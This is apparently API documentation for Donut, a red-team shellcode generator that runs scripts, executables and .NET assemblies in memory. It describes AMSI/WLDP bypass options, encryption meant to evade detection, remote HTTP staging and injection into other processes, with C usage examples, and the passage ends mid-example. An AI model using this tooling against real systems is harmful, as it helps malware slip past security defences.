
<html>
  <head>
    <meta charset="utf-8">
  </head>
  <body>

<h2>Introduction</h2>

<p>This document contains information about the Donut API and how to use them within your own application. Static and dynamic examples for Windows and Linux are shown.</p>

<h2>Table of contents</h2>

<ol>
  <li><a href="#api">Donut API</a></li>
  <li><a href="#config">Donut Configuration</a></li>
  <li><a href="#static">Static Example</a></li>
  <li><a href="#dynamic">Dynamic Example</a></li>
  <li><a href="#instance">Donut Instance</a></li>
  <li><a href="#module">Donut Module</a></li>
  <li><a href="#hashing">Win32 API Hashing</a></li>
  <li><a href="#encryption">Symmetric Encryption</a></li>
  <li><a href="#bypass">Bypasses</a></li>
  <li><a href="#debug">Debugging The Loader</a></li>
  <li><a href="#loader">Extending The Loader</a></li>
</ol>

<h3 id="com">Components</h3>

<p>Donut contains the following elements:</p>

<table>
  <tr>
    <th>File</th>
    <th>Description</th>
  </tr>
  <tr>
    <td>donut.c</td>
    <td>Shellcode generator.</td>
  </tr>
  <tr>
    <td>include/donut.h</td>
    <td>C header file used by the generator.</td>
  </tr>
  <tr>
    <td>lib/donut.dll and lib/donut.lib</td>
    <td>Dynamic and static libraries for Microsoft Windows.</td>
  </tr>
  <tr>
    <td>lib/donut.so and lib/donut.a</td>
    <td>Dynamic and static libraries for Linux.</td>
  </tr>
  <tr>
    <td>lib/donut.h</td>
    <td>C header file to be used for C/C++ based projects.</td>
  </tr>
  <tr>
    <td>donutmodule.c</td>
    <td>The CPython wrapper for Donut. Used by the Python module.</td>
  </tr>
  <tr>
    <td>setup.py</td>
    <td>The setup file for installing Donut as a Pip Python3 module.</td>
  </tr>
  <tr>
    <td>hash.c</td>
    <td>Maru hash function. Uses the Speck 64-bit block cipher with Davies-Meyer construction for API hashing.</td>
  </tr>
  <tr>
    <td>encrypt.c</td>
    <td>Chaskey block cipher for encrypting modules.</td>
  </tr>
  <tr>
    <td>loader/loader.c</td>
    <td>Main file for the shellcode.</td>
  </tr>
  <tr>
    <td>loader/inmem_dotnet.c</td>
    <td>In-Memory loader for .NET EXE/DLL assemblies.</td>
  </tr>
  <tr>
    <td>loader/inmem_pe.c</td>
    <td>In-Memory loader for EXE/DLL files.</td>
  </tr>
  <tr>
    <td>loader/inmem_script.c</td>
    <td>In-Memory loader for VBScript/JScript files.</td>
  </tr>
  <tr>
    <td>loader/activescript.c</td>
    <td>ActiveScriptSite interface required for in-memory execution of VBS/JS files.</td>
  </tr>
  <tr>
    <td>loader/wscript.c</td>
    <td>Supports a number of WScript methods that cscript/wscript support.</td>
  </tr>
  <tr>
    <td>loader/depack.c</td>
    <td>Supports unpacking of modules compressed with aPLib.</td>
  </tr>
  <tr>
    <td>loader/bypass.c</td>
    <td>Functions to bypass Anti-malware Scan Interface (AMSI) and Windows Local Device Policy (WLDP).</td>
  </tr>
  <tr>
    <td>loader/http_client.c</td>
    <td>Downloads a module from remote staging server into memory.</td>
  </tr>
  <tr>
    <td>loader/peb.c</td>
    <td>Used to resolve the address of DLL functions via Process Environment Block (PEB).</td>
  </tr>
  <tr>
    <td>loader/clib.c</td>
    <td>Replaces common C library functions like memcmp, memcpy and memset.</td>
  </tr>
  <tr>
    <td>loader/getpc.c</td>
    <td>Assembly code stub to return the value of the EIP register.</td>
  </tr>
  <tr>
    <td>loader/inject.c</td>
    <td>Simple process injector for Windows that can be used for testing the loader.</td>
  </tr>
  <tr>
    <td>loader/runsc.c</td>
    <td>Simple shellcode runner for Linux and Windows that can be used for testing the loader.</td>
  </tr>
  <tr>
    <td>loader/exe2h/exe2h.c</td>
    <td>Extracts the machine code from compiled loader and saves as array to C header and Go files.</td>
  </tr>
</table>



<h3 id="plan">Project plan</h3>

<ul>
  <li>Create a donut.py generator that uses the same command-line parameters as donut.exe.</li>
  <li>Add support for HTTP proxies.</li>
  <li>Write a blog post on how to integrate donut into your tooling, debug it, customize it, and design loaders that work with it.</li>
</ul>

<h2 id="api">Donut API</h2>

<p>Shared/dynamic and static libraries for both Windows and Linux provide access to three API.</p>

<ol>

  <li><code>int DonutCreate(PDONUT_CONFIG)</code></li>
  <p>Builds the Donut shellcode/loader using settings stored in a <code>DONUT_CONFIG</code> structure.</p>
  <li><code>int DonutDelete(PDONUT_CONFIG)</code></li>
  <p>Releases any resources allocated by a successful call to <code>DonutCreate</code>.</p>
  <li><code>const char* DonutError(int error)</code></li>
  <p>Returns a description for an error code returned by <code>DonutCreate</code>.</p>

</ol>

<p>The Donut project already contains a generator in C. <a href="https://twitter.com/nixbyte">nixbyte</a> has written <a href="https://github.com/n1xbyte/donutCS">a generator in C#</a>. awgh has written <a href="https://github.com/Binject/go-donut/">a generator in Go</a> and <a href="https://twitter.com/byt3bl33d3r">byt3bl33d3r</a> has written a Python module.</p>

<h2 id="config">Donut Configuration</h2>

<p>The minimum configuration required to build a shellcode is a path to a VBS/JS/EXE/DLL file that will be executed in-memory. If the file is a .NET DLL, a namespace and method are required. If the module will be stored on a staging server, a URL is required. The following structure is declared in donut.h and should be zero initialized prior to setting any member.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_CONFIG <span style='color:#800080; '>{</span>
    uint32_t        len<span style='color:#808030; '>,</span> zlen<span style='color:#800080; '>;</span>                <span style='color:#696969; '>// original length of input file and compressed length</span>
    <span style='color:#696969; '>// general / misc options for loader</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             arch<span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// target architecture</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             bypass<span style='color:#800080; '>;</span>                   <span style='color:#696969; '>// bypass option for AMSI/WDLP</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             compress<span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// engine to use when compressing file via RtlCompressBuffer</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             entropy<span style='color:#800080; '>;</span>                  <span style='color:#696969; '>// entropy/encryption level</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             format<span style='color:#800080; '>;</span>                   <span style='color:#696969; '>// output format for loader</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             exit_opt<span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// return to caller or invoke RtlExitUserProcess to terminate the host process</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             thread<span style='color:#800080; '>;</span>                   <span style='color:#696969; '>// run entrypoint of unmanaged EXE as a thread. attempts to intercept calls to exit-related API</span>
    uint64_t        oep<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// original entrypoint of target host file</span>
    
    <span style='color:#696969; '>// files in/out</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            input<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>    <span style='color:#696969; '>// name of input file to read and load in-memory</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            output<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>   <span style='color:#696969; '>// name of output file to save loader</span>
    
    <span style='color:#696969; '>// .NET stuff</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            runtime<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>  <span style='color:#696969; '>// runtime version to use for CLR</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            domain<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>   <span style='color:#696969; '>// name of domain to create for .NET DLL/EXE</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            cls<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>      <span style='color:#696969; '>// name of class with optional namespace for .NET DLL</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            method<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>   <span style='color:#696969; '>// name of method or DLL function to invoke for .NET DLL and unmanaged DLL</span>
    
    <span style='color:#696969; '>// command line for DLL/EXE</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            param<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>    <span style='color:#696969; '>// command line to use for unmanaged DLL/EXE and .NET DLL/EXE</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             unicode<span style='color:#800080; '>;</span>                  <span style='color:#696969; '>// param is passed to DLL function without converting to unicode</span>
    
    <span style='color:#696969; '>// HTTP/DNS staging information</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            server<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>   <span style='color:#696969; '>// points to root path of where module will be stored on remote HTTP server or DNS server</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            modname<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>  <span style='color:#696969; '>// name of module written to disk for http stager</span>
    
    <span style='color:#696969; '>// DONUT_MODULE</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             mod_type<span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// VBS/JS/DLL/EXE</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             mod_len<span style='color:#800080; '>;</span>                  <span style='color:#696969; '>// size of DONUT_MODULE</span>
    DONUT_MODULE    <span style='color:#808030; '>*</span>mod<span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// points to DONUT_MODULE</span>
    
    <span style='color:#696969; '>// DONUT_INSTANCE</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             inst_type<span style='color:#800080; '>;</span>                <span style='color:#696969; '>// DONUT_INSTANCE_EMBED or DONUT_INSTANCE_HTTP</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             inst_len<span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// size of DONUT_INSTANCE</span>
    DONUT_INSTANCE  <span style='color:#808030; '>*</span>inst<span style='color:#800080; '>;</span>                    <span style='color:#696969; '>// points to DONUT_INSTANCE</span>
    
    <span style='color:#696969; '>// shellcode generated from configuration</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             pic_len<span style='color:#800080; '>;</span>                  <span style='color:#696969; '>// size of loader/shellcode</span>
    <span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span>           pic<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// points to loader/shellcode</span>
<span style='color:#800080; '>}</span> DONUT_CONFIG<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>PDONUT_CONFIG<span style='color:#800080; '>;</span>
</pre>

<p>The following table provides a description of each member.</p>

<table border="1">
  <tr>
    <th>Member</th>
    <th>Description</th>
  </tr>
  <tr>
    <td><code>len, zlen</code></td>
    <td><var>len</var> holds the length of the file to execute in-memory. If compression is used, <var>zlen</var> will hold the length of file compressed.</td>
  </tr>
  <tr>
    <td><code>arch</code></td>
    <td>Indicates the type of assembly code to generate. <code>DONUT_ARCH_X86</code> and <code>DONUT_ARCH_X64</code> are self-explanatory. <code>DONUT_ARCH_X84</code> indicates dual-mode that combines shellcode for both X86 and AMD64. ARM64 will be supported at some point.</td>
  </tr>
  <tr>
    <td><code>bypass</code></td>
    <td>Specifies behaviour of the code responsible for bypassing AMSI and WLDP. The current options are <code>DONUT_BYPASS_NONE</code> which indicates that no attempt be made to disable AMSI or WLDP. <code>DONUT_BYPASS_ABORT</code> indicates that failure to disable should result in aborting execution of the module. <code>DONUT_BYPASS_CONTINUE</code> indicates that even if AMSI/WDLP bypasses fail, the shellcode will continue with execution.</td>
  </tr>
  <tr>
    <td><code>compress</code></td>
    <td>Indicates if the input file should be compressed. Available engines are <code>DONUT_COMPRESS_APLIB</code> to use the <a href="http://ibsensoftware.com/products_aPLib.html">aPLib</a> algorithm. For builds on Windows, the <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-rtlcompressbuffer">RtlCompressBuffer</a> API is available and supports <code>DONUT_COMPRESS_LZNT1</code>, <code>DONUT_COMPRESS_XPRESS</code> and <code>DONUT_COMPRESS_XPRESS_HUFF</code>.</td>
  </tr>
  <tr>
    <td><code>entropy</code></td>
    <td>Indicates whether Donut should use entropy and/or encryption for the loader to help evade detection. Available options are <code>DONUT_ENTROPY_NONE</code>, <code>DONUT_ENTROPY_RANDOM</code>, which generates random strings and <code>DONUT_ENTROPY_DEFAULT</code> that combines <code>DONUT_ENTROPY_RANDOM</code> with symmetric encryption.</td>
  </tr>
  <tr>
    <td><code>format</code></td>
    <td>Specifies the output format for the shellcode loader. Supported formats are <code>DONUT_FORMAT_BINARY</code>, <code>DONUT_FORMAT_BASE64</code>, <code>DONUT_FORMAT_RUBY</code>, <code>DONUT_FORMAT_C</code>, <code>DONUT_FORMAT_PYTHON</code>, <code>DONUT_FORMAT_POWERSHELL</code>, <code>DONUT_FORMAT_CSHARP</code> and <code>DONUT_FORMAT_HEX</code>. On Windows, the base64 string is copied to the clipboard.</td>
  </tr>
  <tr>
    <td><code>exit_opt</code></td>
    <td>When the shellcode ends, <code>RtlExitUserThread</code> is called, which is the default behaviour. Set this to <code>DONUT_OPT_EXIT_PROCESS</code> to terminate the host process via the <code>RtlExitUserProcess</code> API.</td>
  </tr>
  <tr>
    <td><code>thread</code></td>
    <td>If the file is an unmanaged EXE, the loader will run the entrypoint as a thread. The loader also attempts to intercept calls to exit-related API stored in the Import Address Table by replacing those pointers with the address of the <code>RtlExitUserThread</code> API. However, hooking via IAT is generally unreliable and Donut may use code splicing / hooking in the future.</td>
  </tr>
  <tr>
    <td><code>oep</code></td>
    <td>Tells the loader to create a new thread before continuing execution at tht OEP provided by the user. Address should be in hexadecimal format.</td>
  </tr>
  
  <tr>
    <td><code>input</code></td>
    <td>The path of file to execute in-memory. VBS/JS/EXE/DLL files are supported.</td>
  </tr>
  <tr>
    <td><code>output</code></td>
    <td>The path of where to save the shellcode/loader. Default is "loader.bin".</td>
  </tr>
  
  <tr>
    <td><code>runtime</code></td>
    <td>The CLR runtime version to use for a .NET assembly. If none is provided, Donut will try reading from the PE's COM directory. If that fails, v4.0.30319 is used by default.</td>
  </tr>
  <tr>
    <td><code>domain</code></td>
    <td>AppDomain name to create. If one is not specified by the caller, it will be generated randomly. If entropy is disabled, it will be set to "AAAAAAAA"</td>
  </tr>
  <tr>
    <td><code>cls</code></td>
    <td>The class name with method to invoke. A namespace is optional. e.g: <var>namespace.class</var></td>
  </tr>
  <tr>
    <td><code>method</code></td>
    <td>The method that will be invoked by the shellcode once a .NET assembly is loaded into memory. This also holds the name of an exported API if the module is an unmanaged DLL.</td>
  </tr>
  
  <tr>
    <td><code>param</code></td>
    <td>String with a list of parameters for the .NET method or DLL function. For unmanaged EXE files, a 4-byte string is generated randomly to act as the module name. If entropy is disabled, this will be "AAAA"</td>
  </tr>
  <tr>
    <td><code>unicode</code></td>
    <td>By default, the <code>param</code> string is passed to an unmanaged DLL function as-is, in ANSI format. If set, param is converted to UNICODE.</td>
  </tr>
  
  <tr>
    <td><code>server</code></td>
    <td>If the instance <code>type</code> is <code>DONUT_INSTANCE_HTTP</code>, this should contain the server and path of where module will be stored. e.g: https://www.staging-server.com/modules/</td>
  </tr>

  <tr>
    <td><code>modname</code></td>
    <td>If the <code>type</code> is <code>DONUT_INSTANCE_HTTP</code>, this will contain the name of the module for where to save the contents of <code>mod</code> to disk. If none is provided by the user, it will be generated randomly. If entropy is disabled, it will be set to "AAAAAAAA"</td>
  </tr>
  <tr>
    <td><code>mod_type</code></td>
    <td>Indicates the type of file detected by <code>DonutCreate</code>. For example, <code>DONUT_MODULE_VBS</code> indicates a VBScript file.</td>
  </tr>
  <tr>
    <td><code>mod_len</code></td>
    <td>The total size of the <var>Module</var> pointed to by <code>mod</code>.</td>
  </tr>
  <tr>
    <td><code>mod</code></td>
    <td>Points to encrypted <var>Module</var>. If the <code>type</code> is <code>DONUT_INSTANCE_HTTP</code>, this should be saved to file using the <code>modname</code> and accessible via HTTP server.</td>
  </tr>
  
  <tr>
    <td><code>inst_type</code></td>
    <td><code>DONUT_INSTANCE_EMBED</code> indicates a self-contained payload which means the file is embedded. <code>DONUT_INSTANCE_HTTP</code> indicates the file is stored on a remote HTTP server.</td>
  </tr>
  <tr>
    <td><code>inst_len</code></td>
    <td>The total size of the <var>Instance</var> pointed to by <code>inst</code>.</td>
  </tr>
  <tr>
    <td><code>inst</code></td>
    <td>Points to an encrypted <var>Instance</var> after a successful call to <code>DonutCreate</code>. Since it's already attached to the <code>pic</code>, this is only provided for debugging purposes.</td>
  </tr>
  
  <tr>
    <td><code>pic_len</code></td>
    <td>The size of data pointed to by <code>pic</code>.</td>
  </tr>
  <tr>
    <td><code>pic</code></td>
    <td>Points to the loader/shellcode. This should be injected into a remote process.</td>
  </tr>
</table>

<h2 id="static">Static Example</h2>

<p>The following is linked with the static library donut.lib on Windows or donut.a on Linux.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#004a43; '>#</span><span style='color:#004a43; '>include </span><span style='color:#800000; '>"</span><span style='color:#40015a; '>donut.h</span><span style='color:#800000; '>"</span>

<span style='color:#800000; font-weight:bold; '>int</span> <span style='color:#400000; '>main</span><span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>int</span> argc<span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>argv<span style='color:#808030; '>[</span><span style='color:#808030; '>]</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
    DONUT_CONFIG c<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>int</span>          err<span style='color:#800080; '>;</span>
    <span style='color:#603000; '>FILE</span>         <span style='color:#808030; '>*</span>out<span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// need at least a file</span>
    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>argc <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#008c00; '>2</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      <span style='color:#603000; '>printf</span><span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>  [ usage: donut_static &lt;EXE></span><span style='color:#0f69ff; '>\n</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
      <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
    <span style='color:#800080; '>}</span>
    
    <span style='color:#603000; '>memset</span><span style='color:#808030; '>(</span><span style='color:#808030; '>&amp;</span>c<span style='color:#808030; '>,</span> <span style='color:#008c00; '>0</span><span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>sizeof</span><span style='color:#808030; '>(</span>c<span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// copy input file</span>
    <span style='color:#400000; '>lstrcpyn</span><span style='color:#808030; '>(</span>c<span style='color:#808030; '>.</span>input<span style='color:#808030; '>,</span> argv<span style='color:#808030; '>[</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>]</span><span style='color:#808030; '>,</span> DONUT_MAX_NAME<span style='color:#808030; '>-</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// default settings</span>
    c<span style='color:#808030; '>.</span>inst_type <span style='color:#808030; '>=</span> DONUT_INSTANCE_EMBED<span style='color:#800080; '>;</span>   <span style='color:#696969; '>// file is embedded</span>
    c<span style='color:#808030; '>.</span>arch      <span style='color:#808030; '>=</span> DONUT_ARCH_X84<span style='color:#800080; '>;</span>         <span style='color:#696969; '>// dual-mode (x86+amd64)</span>
    c<span style='color:#808030; '>.</span>bypass    <span style='color:#808030; '>=</span> DONUT_BYPASS_CONTINUE<span style='color:#800080; '>;</span>  <span style='color:#696969; '>// continues loading even if disabling AMSI/WLDP fails</span>
    c<span style='color:#808030; '>.</span>format    <span style='color:#808030; '>=</span> DONUT_FORMAT_BINARY<span style='color:#800080; '>;</span>    <span style='color:#696969; '>// default output format</span>
    c<span style='color:#808030; '>.</span>compress  <span style='color:#808030; '>=</span> DONUT_COMPRESS_NONE<span style='color:#800080; '>;</span>    <span style='color:#696969; '>// compression is disabled by default</span>
    c<span style='color:#808030; '>.</span>entropy   <span style='color:#808030; '>=</span> DONUT_ENTROPY_DEFAULT<span style='color:#800080; '>;</span>  <span style='color:#696969; '>// enable random names + symmetric encryption by default</span>
    c<span style='color:#808030; '>.</span>exit_opt  <span style='color:#808030; '>=</span> DONUT_OPT_EXIT_THREAD<span style='color:#800080; '>;</span>  <span style='color:#696969; '>// default behaviour is to exit the thread</span>
    c<span style='color:#808030; '>.</span>thread    <span style='color:#808030; '>=</span> <span style='color:#008c00; '>1</span><span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// run entrypoint as a thread</span>
    c<span style='color:#808030; '>.</span>unicode   <span style='color:#808030; '>=</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// command line will not be converted to unicode for unmanaged DLL function</span>
    
    <span style='color:#696969; '>// generate the shellcode</span>
    err <span style='color:#808030; '>=</span> DonutCreate<span style='color:#808030; '>(</span><span style='color:#808030; '>&amp;</span>c<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>err <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> DONUT_ERROR_SUCCESS<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      <span style='color:#603000; '>printf</span><span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>  [ Error : </span><span style='color:#007997; '>%s</span><span style='color:#0f69ff; '>\n</span><span style='color:#800000; '>"</span><span style='color:#808030; '>,</span> DonutError<span style='color:#808030; '>(</span>err<span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
      <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
    <span style='color:#800080; '>}</span> 
    
    <span style='color:#603000; '>printf</span><span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>  [ loader saved to </span><span style='color:#007997; '>%s</span><span style='color:#0f69ff; '>\n</span><span style='color:#800000; '>"</span><span style='color:#808030; '>,</span> c<span style='color:#808030; '>.</span>output<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    DonutDelete<span style='color:#808030; '>(</span><span style='color:#808030; '>&amp;</span>c<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span>
</pre>

<h2 id="dynamic">Dynamic Example</h2>

<p>This example requires access to donut.dll on Windows or donut.so on Linux.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#004a43; '>#</span><span style='color:#004a43; '>include </span><span style='color:#800000; '>"</span><span style='color:#40015a; '>donut.h</span><span style='color:#800000; '>"</span>

<span style='color:#800000; font-weight:bold; '>int</span> <span style='color:#400000; '>main</span><span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>int</span> argc<span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>argv<span style='color:#808030; '>[</span><span style='color:#808030; '>]</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
    DONUT_CONFIG  c<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>int</span>           err<span style='color:#800080; '>;</span>

    <span style='color:#696969; '>// function pointers</span>
    DonutCreate_t _DonutCreate<span style='color:#800080; '>;</span>
    DonutDelete_t _DonutDelete<span style='color:#800080; '>;</span>
    DonutError_t  _DonutError<span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// need at least a file</span>
    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>argc <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#008c00; '>2</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      <span style='color:#603000; '>printf</span><span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>  [ usage: donut_dynamic &lt;file></span><span style='color:#0f69ff; '>\n</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
      <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
    <span style='color:#800080; '>}</span>
    
    <span style='color:#696969; '>// try load donut.dll or donut.so</span>
<span style='color:#004a43; '>&#xa0;&#xa0;&#xa0;&#xa0;</span><span style='color:#004a43; '>#</span><span style='color:#004a43; '>if</span><span style='color:#004a43; '> </span><span style='color:#004a43; '>defined</span><span style='color:#808030; '>(</span><span style='color:#004a43; '>WINDOWS</span><span style='color:#808030; '>)</span>
      <span style='color:#603000; '>HMODULE</span> m <span style='color:#808030; '>=</span> <span style='color:#400000; '>LoadLibrary</span><span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>donut.dll</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
      <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>m <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
        _DonutCreate <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>DonutCreate_t<span style='color:#808030; '>)</span><span style='color:#400000; '>GetProcAddress</span><span style='color:#808030; '>(</span>m<span style='color:#808030; '>,</span> <span style='color:#800000; '>"</span><span style='color:#0000e6; '>DonutCreate</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
        _DonutDelete <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>DonutDelete_t<span style='color:#808030; '>)</span><span style='color:#400000; '>GetProcAddress</span><span style='color:#808030; '>(</span>m<span style='color:#808030; '>,</span> <span style='color:#800000; '>"</span><span style='color:#0000e6; '>DonutDelete</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
        _DonutError  <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>DonutError_t<span style='color:#808030; '>)</span> <span style='color:#400000; '>GetProcAddress</span><span style='color:#808030; '>(</span>m<span style='color:#808030; '>,</span> <span style='color:#800000; '>"</span><span style='color:#0000e6; '>DonutError</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
        
        <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>_DonutCreate <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span> <span style='color:#808030; '>|</span><span style='color:#808030; '>|</span> _DonutDelete <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span> <span style='color:#808030; '>|</span><span style='color:#808030; '>|</span> _DonutError <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
          <span style='color:#603000; '>printf</span><span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>  [ Unable to resolve Donut API.</span><span style='color:#0f69ff; '>\n</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
          <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
        <span style='color:#800080; '>}</span>
      <span style='color:#800080; '>}</span> <span style='color:#800000; font-weight:bold; '>else</span> <span style='color:#800080; '>{</span>
        <span style='color:#603000; '>printf</span><span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>  [ Unable to load donut.dll.</span><span style='color:#0f69ff; '>\n</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
        <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
      <span style='color:#800080; '>}</span>
<span style='color:#004a43; '>&#xa0;&#xa0;&#xa0;&#xa0;</span><span style='color:#004a43; '>#</span><span style='color:#004a43; '>else</span>
      <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>m <span style='color:#808030; '>=</span> dlopen<span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>donut.so</span><span style='color:#800000; '>"</span><span style='color:#808030; '>,</span> RTLD_LAZY<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
      <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>m <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
        _DonutCreate <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>DonutCreate_t<span style='color:#808030; '>)</span>dlsym<span style='color:#808030; '>(</span>m<span style='color:#808030; '>,</span> <span style='color:#800000; '>"</span><span style='color:#0000e6; '>DonutCreate</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
